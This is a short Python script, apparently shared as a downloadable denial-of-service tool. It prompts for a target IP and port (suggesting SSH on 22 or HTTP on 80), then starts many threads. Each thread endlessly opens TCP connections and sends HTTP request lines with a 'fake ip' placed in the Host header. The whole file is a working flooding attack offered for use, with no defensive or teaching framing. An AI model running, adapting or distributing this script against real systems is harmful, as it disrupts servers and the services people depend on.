import threading
import socket
count = False

print("Thanks for downloading! Make sure to check out my Github. https://github.com/OblivionGhoul")
target = input("Enter the target ip: ")
port = int(input("Insert the port (Port 22: DOS the SSH servers, Port 80: DOS the HTTP servers): "))
fake_ip = input("Enter a fake ip: ")
numThreads = int(input("How many threads would you like to use? "))
isCount = input("Do you want to see how many times the code runs? (Enter 'YES' or 'NO'): ")
if (isCount == "YES"):
    count = True

connectedCount = 0;

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        if (count):
            global connectedCount
            connectedCount += 1
            print(connectedCount)

for i in range(numThreads):
    thread = threading.Thread(target=attack)
    thread.start()